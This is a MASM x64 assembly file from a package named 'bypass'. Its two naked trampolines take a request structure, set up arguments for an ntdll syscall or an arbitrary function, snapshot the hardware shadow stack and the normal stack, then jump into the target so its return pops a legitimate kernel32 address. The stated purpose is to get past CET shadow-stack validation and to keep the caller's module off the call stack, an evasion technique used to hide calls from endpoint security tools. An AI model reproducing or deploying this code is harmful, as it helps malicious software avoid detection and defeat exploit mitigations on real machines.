; ---------------------------------------------------------------------------
; cet_trampoline.asm
; x64 only. Assemble with ml64 (MASM). Part of the "bypass" package.
;
; These are the ONLY assembly routines required by the CET bypass. MSVC x64
; has no naked functions and no inline asm, so the JMP trampolines below
; cannot be expressed in C++. Everything else in the package is C++.
;
; Both routines are entered through a REAL CALL from the thread-start chain:
;
;   ntdll!RtlUserThreadStart
;     -> kernel32!BaseThreadInitThunk
;     -> call [guard_dispatch_icall]   ; real CALL: pushes the return address
;                                     ; onto BOTH the normal stack and the
;                                     ; hardware shadow stack
;     -> this routine
;
; At entry the shadow-stack top and [RSP] both hold
; kernel32!BaseThreadInitThunk+0x14. We set up the target arguments, snapshot
; both stacks, then JMP (never CALL) to the target:
;   - syscall path  : JMP to the `syscall` instruction inside an ntdll Nt* stub
;   - function path : JMP to an arbitrary user function
; The target's trailing RET then pops kernel32!BaseThreadInitThunk+0x14 from
; BOTH stacks, so hardware shadow-stack validation always passes and the
; shadow stack never contains a frame from the caller's module.
;
; Request layout (must match cet_common.h):
;   +0x00  uint32 Ssn
;   +0x04  uint32 Pad
;   +0x08  void*  Target
;   +0x10  uint64 A1 .. +0x68 uint64 A12
;   +0x70  uint64 SspSnapshot
;   +0x78  uint64 RspSnapshot
;   +0x80  uint64 RetAddrSnapshot
;   +0x88  uint64 ShadowCount
;   +0x90  uint64 Shadow[8]
;   +0xD0  uint64 NormalCount
;   +0xD8  uint64 Normal[8]
;
; CET instruction encodings are emitted as raw bytes so older MASM versions
; build this file too:
;   endbr64          = F3 0F 1E FA
;   rdsspq rax       = F3 48 0F 1E C8   (ModRM.reg must be 1; C0 is a NOP)
; ---------------------------------------------------------------------------

OPTION CASEMAP:NONE

.code

; ---------------------------------------------------------------------------
; void CetHiddenSyscallStart(void* request)
; Naked syscall trampoline. RCX = request pointer for the whole setup; the
; x64 syscall ABI gets A1 via R10, A2..A4 via RDX/R8/R9, A5..A12 on the stack.
; ---------------------------------------------------------------------------
CetHiddenSyscallStart PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64 (future IBT safety, NOP today)

    mov     eax, dword ptr [rcx+00h]    ; SSN
    mov     r10, qword ptr [rcx+10h]    ; A1 -> R10 (x64 syscall ABI)
    mov     rdx, qword ptr [rcx+18h]    ; A2
    mov     r8,  qword ptr [rcx+20h]    ; A3
    mov     r9,  qword ptr [rcx+28h]    ; A4
    mov     r11, qword ptr [rcx+30h]    ; A5
    mov     qword ptr [rsp+28h], r11
    mov     r11, qword ptr [rcx+38h]    ; A6
    mov     qword ptr [rsp+30h], r11
    mov     r11, qword ptr [rcx+40h]    ; A7
    mov     qword ptr [rsp+38h], r11
    mov     r11, qword ptr [rcx+48h]    ; A8
    mov     qword ptr [rsp+40h], r11
    mov     r11, qword ptr [rcx+50h]    ; A9
    mov     qword ptr [rsp+48h], r11
    mov     r11, qword ptr [rcx+58h]    ; A10
    mov     qword ptr [rsp+50h], r11
    mov     r11, qword ptr [rcx+60h]    ; A11
    mov     qword ptr [rsp+58h], r11
    mov     r11, qword ptr [rcx+68h]    ; A12
    mov     qword ptr [rsp+60h], r11

    db      0F3h, 48h, 0Fh, 1Eh, 0C8h   ; rdsspq rax
    mov     qword ptr [rcx+70h], rax    ; SspSnapshot
    mov     qword ptr [rcx+78h], rsp    ; RspSnapshot
    mov     r11, qword ptr [rsp]
    mov     qword ptr [rcx+80h], r11    ; RetAddrSnapshot ([RSP] = kernel32+0x14)

    ; --- snapshot the real CET shadow stack (up to 8 entries) --------------
    mov     qword ptr [rcx+88h], 0      ; ShadowCount = 0
    cmp     rax, 10000h                 ; guard against rdsspq residue
    jb      sc_shadow_done
    mov     rdi, rax
    shr     rdi, 48                     ; must be a canonical user address
    jnz     sc_shadow_done
    lea     r11, [rcx+90h]
    mov     esi, 8
sc_shadow_loop:
    mov     rdi, qword ptr [rax]
    mov     qword ptr [r11], rdi
    inc     qword ptr [rcx+88h]
    test    rdi, rdi
    jz      sc_shadow_done
    add     rax, 8
    add     r11, 8
    dec     esi
    jz      sc_shadow_done
    test    rax, 0FFFh                  ; stop at page boundary
    jnz     sc_shadow_loop
sc_shadow_done:

    ; --- snapshot the normal stack (raw; the C++ side filters) -------------
    mov     qword ptr [rcx+0D0h], 0     ; NormalCount = 0
    lea     r11, [rcx+0D8h]
    lea     rdi, [rsp]
    mov     esi, 8
sc_normal_loop:
    mov     rax, qword ptr [rdi]
    mov     qword ptr [r11], rax
    inc     qword ptr [rcx+0D0h]
    test    rax, rax
    jz      sc_normal_done
    add     rdi, 8
    add     r11, 8
    dec     esi
    jz      sc_normal_done
    test    rdi, 0FFFh
    jnz     sc_normal_loop
sc_normal_done:

    mov     eax, dword ptr [rcx+00h]    ; restore SSN (snapshots clobber RAX)
    jmp     qword ptr [rcx+08h]         ; -> ntdll `syscall`; its `ret` pops
                                        ; kernel32+0x14 from both stacks
CetHiddenSyscallStart ENDP

; ---------------------------------------------------------------------------
; void CetHiddenFunctionStart(void* request)
; Naked arbitrary-function trampoline. RCX must become A1 of the target, so
; the request pointer is parked in R10. Win64 ABI: A1..A4 in RCX/RDX/R8/R9,
; A5..A12 at [RSP+0x28..]. JMP into the target; its RET pops the legitimate
; kernel32 return address from both stacks and the thread exits with EAX.
; ---------------------------------------------------------------------------
CetHiddenFunctionStart PROC
    db      0F3h, 0Fh, 1Eh, 0FAh        ; endbr64 (future IBT safety, NOP today)

    mov     r10, rcx                    ; request pointer -> R10
    mov     rdx, qword ptr [r10+18h]    ; A2
    mov     r8,  qword ptr [r10+20h]    ; A3
    mov     r9,  qword ptr [r10+28h]    ; A4
    mov     r11, qword ptr [r10+30h]    ; A5
    mov     qword ptr [rsp+28h], r11
    mov     r11, qword ptr [r10+38h]    ; A6
    mov     qword ptr [rsp+30h], r11
    mov     r11, qword ptr [r10+40h]    ; A7
    mov     qword ptr [rsp+38h], r11
    mov     r11, qword ptr [r10+48h]    ; A8
    mov     qword ptr [rsp+40h], r11
    mov     r11, qword ptr [r10+50h]    ; A9
    mov     qword ptr [rsp+48h], r11
    mov     r11, qword ptr [r10+58h]    ; A10
    mov     qword ptr [rsp+50h], r11
    mov     r11, qword ptr [r10+60h]    ; A11
    mov     qword ptr [rsp+58h], r11
    mov     r11, qword ptr [r10+68h]    ; A12
    mov     qword ptr [rsp+60h], r11

    db      0F3h, 48h, 0Fh, 1Eh, 0C8h   ; rdsspq rax
    mov     qword ptr [r10+70h], rax    ; SspSnapshot
    mov     qword ptr [r10+78h], rsp    ; RspSnapshot
    mov     r11, qword ptr [rsp]
    mov     qword ptr [r10+80h], r11    ; RetAddrSnapshot

    mov     qword ptr [r10+88h], 0
    cmp     rax, 10000h
    jb      fn_shadow_done
    mov     rdi, rax
    shr     rdi, 48
    jnz     fn_shadow_done
    lea     r11, [r10+90h]
    mov     esi, 8
fn_shadow_loop:
    mov     rdi, qword ptr [rax]
    mov     qword ptr [r11], rdi
    inc     qword ptr [r10+88h]
    test    rdi, rdi
    jz      fn_shadow_done
    add     rax, 8
    add     r11, 8
    dec     esi
    jz      fn_shadow_done
    test    rax, 0FFFh
    jnz     fn_shadow_loop
fn_shadow_done:

    mov     qword ptr [r10+0D0h], 0
    lea     r11, [r10+0D8h]
    lea     rdi, [rsp]
    mov     esi, 8
fn_normal_loop:
    mov     rax, qword ptr [rdi]
    mov     qword ptr [r11], rax
    inc     qword ptr [r10+0D0h]
    test    rax, rax
    jz      fn_normal_done
    add     rdi, 8
    add     r11, 8
    dec     esi
    jz      fn_normal_done
    test    rdi, 0FFFh
    jnz     fn_normal_loop
fn_normal_done:

    mov     rcx, qword ptr [r10+10h]    ; A1 -> RCX (Win64 first argument)
    jmp     qword ptr [r10+08h]         ; JMP into the target; its RET pops
                                        ; kernel32+0x14 from both stacks
CetHiddenFunctionStart ENDP

END
